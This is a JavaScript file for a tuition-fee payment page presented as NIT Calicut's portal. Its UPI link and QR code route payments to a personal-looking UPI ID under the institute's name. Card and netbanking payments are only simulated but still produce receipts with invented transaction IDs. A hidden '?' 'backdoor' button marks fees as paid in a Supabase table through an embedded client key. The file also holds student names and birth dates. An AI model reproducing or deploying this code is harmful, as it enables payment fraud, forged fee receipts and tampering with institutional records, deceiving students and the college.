/* ==========================================================================
   SUPABASE CLIENT CONFIGURATION
   ========================================================================== */
const SUPABASE_URL = "https://xzmjdktvtyhgmrjdnvan.supabase.co"; 
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6bWpka3R2dHloZ21yamRudmFuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE2OTA3ODYsImV4cCI6MjA5NzI2Njc4Nn0.bwtGPsL21ilmPklrlaqEclzfBM11lMKL4Z0-os92vSo";

let supabaseClient = null;
if (SUPABASE_URL && SUPABASE_ANON_KEY) {
    try {
        const { createClient } = window.supabase || {};
        if (createClient) {
            supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            console.log("Supabase client initialized successfully.");
        } else {
            console.error("Supabase SDK script not loaded from CDN.");
        }
    } catch (e) {
        console.error("Error initializing Supabase client:", e);
    }
}

/* ==========================================================================
   MOCK STUDENT DATABASE (FALLBACK)
   ========================================================================== */
const studentDatabase = {
    "B240611EC": {
        rollNo: "B240611EC",
        dob: "10/12/2006",
        name: "D KAMESH",
        demand: 80824.00,
        exemption: 62500.00,
        paid: 18324.00,
        remaining: 0.00
    },
    "B240212CS": {
        rollNo: "B240212CS",
        dob: "15/08/2005",
        name: "AMAL JITH",
        demand: 75000.00,
        exemption: 25000.00,
        paid: 50000.00,
        remaining: 0.00
    },
    "B240101ME": {
        rollNo: "B240101ME",
        dob: "01/01/2006",
        name: "SARA JOHNSON",
        demand: 75000.00,
        exemption: 75000.00,
        paid: 0.00,
        remaining: 0.00
    }
};

let activeStudent = null;

/* ==========================================================================
   DOM ELEMENT SELECTIONS
   ========================================================================== */
const searchForm = document.getElementById("payment-search-form");
const rollNoInput = document.getElementById("roll-no");
const dobInput = document.getElementById("dob");
const periodSelect = document.getElementById("period");

const placeholderPanel = document.getElementById("details-placeholder");
const studentPanel = document.getElementById("student-details-content");

const studentNameText = document.getElementById("student-name");
const valDemand = document.getElementById("val-demand");
const valExemption = document.getElementById("val-exemption");
const valRemaining = document.getElementById("val-remaining");
const valPaid = document.getElementById("val-paid");
const payAmountInput = document.getElementById("input-pay-amount");
const amountValidationMsg = document.getElementById("amount-validation-msg");
const declarationCheck = document.getElementById("declaration-check");
const btnProceed = document.getElementById("btn-proceed");

const btnFeeStructure = document.getElementById("btn-fee-structure");
const modalFeeStructure = document.getElementById("modal-fee-structure");
const closeButtons = document.querySelectorAll(".btn-close-modal");

// Checkout, Processing & Receipt modals
const modalCheckout = document.getElementById("modal-checkout");
const summaryStudentName = document.getElementById("summary-student-name");
const summaryRollNo = document.getElementById("summary-roll-no");
const summaryAmount = document.getElementById("summary-amount");

const modalProcessing = document.getElementById("modal-processing");

const modalReceipt = document.getElementById("modal-receipt");
const receiptTxId = document.getElementById("receipt-tx-id");
const receiptStudentName = document.getElementById("receipt-student-name");
const receiptRollNo = document.getElementById("receipt-roll-no");
const receiptPeriod = document.getElementById("receipt-period");
const receiptDatetime = document.getElementById("receipt-datetime");
const receiptMode = document.getElementById("receipt-mode");
const receiptValTuition = document.getElementById("receipt-val-tuition");
const receiptValOther = document.getElementById("receipt-val-other");
const receiptValPaid = document.getElementById("receipt-val-paid");
const btnPrintReceipt = document.getElementById("btn-print-receipt");

// Backdoor & UPI DOM Elements
const btnHelpTrigger = document.getElementById("btn-help-trigger");
const upiQrImage = document.getElementById("upi-qr-image");
const lnkPayUpiApp = document.getElementById("lnk-pay-upi-app");

/* ==========================================================================
   AUTO FORMATTERS & INPUT LISTENERS
   ========================================================================== */
dobInput.addEventListener("input", function(e) {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 8) {
        value = value.substring(0, 8);
    }
    
    let formatted = "";
    if (value.length > 0) {
        formatted += value.substring(0, 2);
    }
    if (value.length > 2) {
        formatted += "/" + value.substring(2, 4);
    }
    if (value.length > 4) {
        formatted += "/" + value.substring(4, 8);
    }
    
    e.target.value = formatted;
    triggerAutoFetch();
});

rollNoInput.addEventListener("input", function(e) {
    e.target.value = e.target.value.toUpperCase();
    triggerAutoFetch();
});

periodSelect.addEventListener("change", triggerAutoFetch);

searchForm.addEventListener("submit", function(e) {
    e.preventDefault();
    triggerAutoFetch();
});

function triggerAutoFetch() {
    const rollNo = rollNoInput.value.trim().toUpperCase();
    const dob = dobInput.value.trim();
    if (rollNo.length >= 8 && dob.length === 10) {
        fetchStudentDetails(rollNo, dob);
    }
}

// Card Form Input Formatters
const cardNumInput = document.getElementById("card-num");
if (cardNumInput) {
    cardNumInput.addEventListener("input", function(e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 16) value = value.substring(0, 16);
        let formatted = value.match(/.{1,4}/g)?.join(" ") || value;
        e.target.value = formatted;
    });
}

const cardExpiryInput = document.getElementById("card-expiry");
if (cardExpiryInput) {
    cardExpiryInput.addEventListener("input", function(e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 4) value = value.substring(0, 4);
        let formatted = value;
        if (value.length > 2) {
            formatted = value.substring(0, 2) + "/" + value.substring(2);
        }
        e.target.value = formatted;
    });
}

/* ==========================================================================
   STUDENT DETAILS FETCHING
   ========================================================================== */
async function fetchStudentDetails(rollNo, dob) {
    let record = null;
    let fetchedFromSupabase = false;
    
    if (supabaseClient) {
        try {
            const { data, error } = await supabaseClient
                .from('students')
                .select('*')
                .eq('roll_no', rollNo)
                .eq('dob', dob)
                .maybeSingle();
                
            if (error) {
                console.error("Supabase query error:", error.message);
            } else if (data) {
                record = {
                    rollNo: data.roll_no,
                    dob: data.dob,
                    name: data.name,
                    demand: parseFloat(data.demand || 0),
                    exemption: parseFloat(data.exemption || 0),
                    paid: parseFloat(data.paid || 0),
                    remaining: parseFloat(data.remaining || 0)
                };
                fetchedFromSupabase = true;
                console.log("Loaded student from Supabase:", record);
            }
        } catch (err) {
            console.error("Failed to fetch from Supabase:", err);
        }
    }
    
    if (!record) {
        const localRecord = studentDatabase[rollNo];
        if (localRecord && localRecord.dob === dob) {
            record = localRecord;
            console.log("Loaded student from local mock database fallback:", record);
        }
    }
    
    if (record) {
        activeStudent = record;
        activeStudent.isSupabase = fetchedFromSupabase;
        loadStudentData(record);
    } else {
        activeStudent = null;
        resetFormDisplay();
    }
}

function loadStudentData(student) {
    studentNameText.textContent = student.name;
    valDemand.textContent = formatCurrency(student.demand);
    valExemption.textContent = formatCurrency(student.exemption);
    valRemaining.textContent = formatCurrency(student.remaining);
    valPaid.textContent = formatCurrency(student.paid);
    
    payAmountInput.value = student.remaining.toFixed(2);
    payAmountInput.max = student.remaining;
    
    validateAmountInput();
    
    placeholderPanel.classList.add("hidden");
    studentPanel.classList.remove("hidden");
    
    if (window.innerWidth < 992) {
        studentPanel.scrollIntoView({ behavior: 'smooth' });
    }
}

function resetFormDisplay() {
    studentPanel.classList.add("hidden");
    placeholderPanel.classList.remove("hidden");
}

function formatCurrency(amount) {
    return amount.toLocaleString('en-IN', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

/* ==========================================================================
   VALIDATION & PROCEED TO PAY
   ========================================================================== */
payAmountInput.addEventListener("input", validateAmountInput);

function validateAmountInput() {
    if (!activeStudent) return false;
    
    const amount = parseFloat(payAmountInput.value);
    const remaining = activeStudent.remaining;
    
    if (isNaN(amount) || amount < 0) {
        amountValidationMsg.textContent = "Please enter a valid amount to pay.";
        amountValidationMsg.classList.remove("hidden");
        btnProceed.disabled = true;
        return false;
    } else if (amount > remaining && remaining > 0) {
        amountValidationMsg.textContent = `Amount cannot exceed the remaining balance (₹${formatCurrency(remaining)}).`;
        amountValidationMsg.classList.remove("hidden");
        btnProceed.disabled = true;
        return false;
    } else {
        amountValidationMsg.classList.add("hidden");
        btnProceed.disabled = false;
        return true;
    }
}

btnProceed.addEventListener("click", function() {
    if (!activeStudent) return;
    if (!validateAmountInput()) return;
    
    if (!declarationCheck.checked) {
        showNotification("Please check the declaration box to agree to the payment conditions.", "warning");
        return;
    }
    
    const payingAmount = parseFloat(payAmountInput.value);
    
    // Set checkout summary values
    summaryStudentName.textContent = activeStudent.name;
    summaryRollNo.textContent = activeStudent.rollNo;
    summaryAmount.textContent = "₹ " + formatCurrency(payingAmount);
    
    // Generate UPI URL & QR
    const upiLink = `upi://pay?pa=zenitsuagatsuma@slc&pn=NIT%20Calicut&am=${payingAmount.toFixed(2)}&cu=INR&tn=Tuition%20Fee`;
    upiQrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(upiLink)}`;
    lnkPayUpiApp.href = upiLink;
    
    // Show checkout modal
    openModal(modalCheckout);
});

/* ==========================================================================
   CHECKOUT TAB SWITCHING
   ========================================================================== */
const tabButtons = document.querySelectorAll(".payment-tabs .tab-btn");
tabButtons.forEach(button => {
    button.addEventListener("click", function() {
        tabButtons.forEach(btn => btn.classList.remove("active"));
        document.querySelectorAll(".tab-contents .tab-pane").forEach(pane => pane.classList.remove("active"));
        
        this.classList.add("active");
        const tabId = "tab-" + this.getAttribute("data-tab");
        document.getElementById(tabId).classList.add("active");
    });
});

/* ==========================================================================
   PAYMENT SIMULATIONS (UPI, CARD, NETBANKING)
   ========================================================================== */
// Click pay via UPI app link simulation
lnkPayUpiApp.addEventListener("click", function(e) {
    showNotification("Opening UPI payment application...", "info");
    setTimeout(() => {
        processSimulatedPayment("UPI");
    }, 2000);
});

// Card Payment Submit
document.getElementById("card-payment-form").addEventListener("submit", function(e) {
    e.preventDefault();
    processSimulatedPayment("Credit/Debit Card");
});

// Netbanking Payment Submit
document.getElementById("btn-pay-netbanking").addEventListener("click", function() {
    let bankName = "Netbanking";
    const selectedRadio = document.querySelector('input[name="selected_bank"]:checked');
    const selectedSelect = document.getElementById("other-banks").value;
    
    if (selectedSelect) {
        bankName = document.getElementById("other-banks").options[document.getElementById("other-banks").selectedIndex].text;
    } else if (selectedRadio) {
        const bankMap = { sbi: "SBI", hdfc: "HDFC Bank", icici: "ICICI Bank", axis: "Axis Bank" };
        bankName = bankMap[selectedRadio.value] || "Netbanking";
    }
    
    processSimulatedPayment(bankName);
});

async function processSimulatedPayment(paymentMethod) {
    closeModal(modalCheckout);
    openModal(modalProcessing);
    
    const paidAmount = parseFloat(payAmountInput.value);
    
    setTimeout(async () => {
        // Update local state
        activeStudent.paid += paidAmount;
        activeStudent.remaining = activeStudent.demand - activeStudent.exemption - activeStudent.paid;
        if (activeStudent.remaining < 0) activeStudent.remaining = 0;
        
        // Sync to Supabase if applicable
        if (activeStudent.isSupabase && supabaseClient) {
            await syncPaymentToSupabase(activeStudent.rollNo, activeStudent.paid, activeStudent.remaining);
        }
        
        closeModal(modalProcessing);
        generateReceipt(activeStudent, paidAmount, paymentMethod);
        loadStudentData(activeStudent);
        openModal(modalReceipt);
    }, 1500);
}

/* ==========================================================================
   BACKDOOR TRIGGER "?"
   ========================================================================== */
btnHelpTrigger.addEventListener("click", async function() {
    if (!activeStudent) {
        showNotification("Please enter Roll No & DOB to fetch student details first.", "warning");
        return;
    }
    
    // Simulate remaining amount being paid completely
    const amountToPay = activeStudent.remaining > 0 ? activeStudent.remaining : 1000.00; // default to 1000 if remaining is 0
    activeStudent.paid += amountToPay;
    activeStudent.remaining = activeStudent.demand - activeStudent.exemption - activeStudent.paid;
    if (activeStudent.remaining < 0) activeStudent.remaining = 0;
    
    showNotification("Backdoor triggered: Simulating payment success...", "success");
    
    // Sync to Supabase
    if (activeStudent.isSupabase && supabaseClient) {
        await syncPaymentToSupabase(activeStudent.rollNo, activeStudent.paid, activeStudent.remaining);
    }
    
    generateReceipt(activeStudent, amountToPay, "UPI (Backdoor)");
    loadStudentData(activeStudent);
    openModal(modalReceipt);
});

async function syncPaymentToSupabase(rollNo, newPaid, newRemaining) {
    try {
        const { error } = await supabaseClient
            .from('students')
            .update({ 
                paid: newPaid, 
                remaining: newRemaining 
            })
            .eq('roll_no', rollNo);
            
        if (error) {
            console.error("Supabase write error:", error.message);
            showNotification("Failed to synchronize payment record to database.", "warning");
        } else {
            console.log("Successfully synchronized payment record to Supabase database.");
        }
    } catch (err) {
        console.error("Failed to write to Supabase:", err);
    }
}

/* ==========================================================================
   RECEIPT GENERATION
   ========================================================================== */
function generateReceipt(student, amountPaid, paymentMethod) {
    const txnId = "TXN" + Math.floor(100000000000 + Math.random() * 900000000000);
    const currentDatetime = new Date().toLocaleString('en-IN', {
        dateStyle: 'medium',
        timeStyle: 'medium'
    });
    
    receiptTxId.textContent = txnId;
    receiptStudentName.textContent = student.name;
    receiptRollNo.textContent = student.rollNo;
    receiptPeriod.textContent = periodSelect.value;
    receiptDatetime.textContent = currentDatetime;
    receiptMode.textContent = paymentMethod;
    
    // 80% Tuition, 20% Laboratory/Other charges
    const tuitionShare = amountPaid * 0.8;
    const otherShare = amountPaid * 0.2;
    
    receiptValTuition.textContent = formatCurrency(tuitionShare);
    receiptValOther.textContent = formatCurrency(otherShare);
    receiptValPaid.textContent = "₹ " + formatCurrency(amountPaid);
}

btnPrintReceipt.addEventListener("click", function() {
    window.print();
});

/* ==========================================================================
   MODAL UTILITIES
   ========================================================================== */
if (btnFeeStructure && modalFeeStructure) {
    btnFeeStructure.addEventListener("click", () => openModal(modalFeeStructure));
}

closeButtons.forEach(button => {
    button.addEventListener("click", function() {
        const targetId = this.getAttribute("data-target");
        const modal = document.getElementById(targetId);
        closeModal(modal);
    });
});

function openModal(modal) {
    modal.classList.remove("hidden");
    document.body.style.overflow = "hidden";
}

function closeModal(modal) {
    modal.classList.add("hidden");
    document.body.style.overflow = "";
}

window.addEventListener("click", function(e) {
    if (e.target.classList.contains("modal-overlay")) {
        if (e.target.id === "modal-processing") return; // don't close processing spinner
        closeModal(e.target);
    }
});

/* ==========================================================================
   TOAST NOTIFICATION ENGINE
   ========================================================================== */
function showNotification(message, type = "info") {
    const existingToast = document.querySelector(".toast-notification");
    if (existingToast) {
        existingToast.remove();
    }
    
    const toast = document.createElement("div");
    toast.className = `toast-notification toast-${type}`;
    
    let icon = "fa-circle-info";
    if (type === "error") icon = "fa-circle-exclamation";
    if (type === "warning") icon = "fa-triangle-exclamation";
    if (type === "success") icon = "fa-circle-check";
    
    toast.innerHTML = `
        <i class="fa-solid ${icon}"></i>
        <span>${message}</span>
    `;
    
    document.body.appendChild(toast);
    
    Object.assign(toast.style, {
        position: 'fixed',
        bottom: '24px',
        right: '24px',
        backgroundColor: '#ffffff',
        boxShadow: '0 8px 30px rgba(0,0,0,0.15)',
        borderRadius: '8px',
        padding: '16px 20px',
        zIndex: '2000',
        display: 'flex',
        alignItems: 'center',
        gap: '12px',
        fontSize: '0.88rem',
        fontWeight: '600',
        borderLeft: '4px solid #0d6efd',
        color: '#212529'
    });
    
    if (type === "error") {
        toast.style.borderLeftColor = "#dc3545";
        toast.querySelector("i").style.color = "#dc3545";
    } else if (type === "warning") {
        toast.style.borderLeftColor = "#ffc107";
        toast.querySelector("i").style.color = "#ffc107";
    } else if (type === "success") {
        toast.style.borderLeftColor = "#198754";
        toast.querySelector("i").style.color = "#198754";
    } else {
        toast.querySelector("i").style.color = "#0d6efd";
    }
    
    if (!document.getElementById("toast-animation-styles")) {
        const styleSheet = document.createElement("style");
        styleSheet.id = "toast-animation-styles";
        styleSheet.textContent = `
            @keyframes toastIn {
                from { transform: translateY(20px); opacity: 0; }
                to { transform: translateY(0); opacity: 1; }
            }
        `;
        document.head.appendChild(styleSheet);
    }
    
    toast.style.animation = "toastIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards";
    
    setTimeout(() => {
        toast.style.animation = "toastIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) reverse forwards";
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

/* ==========================================================================
   INITIALIZATION
   ========================================================================== */
window.addEventListener("load", () => {
    const rollNo = rollNoInput.value.trim().toUpperCase();
    const dob = dobInput.value.trim();
    if (rollNo && dob) {
        fetchStudentDetails(rollNo, dob);
    }
});
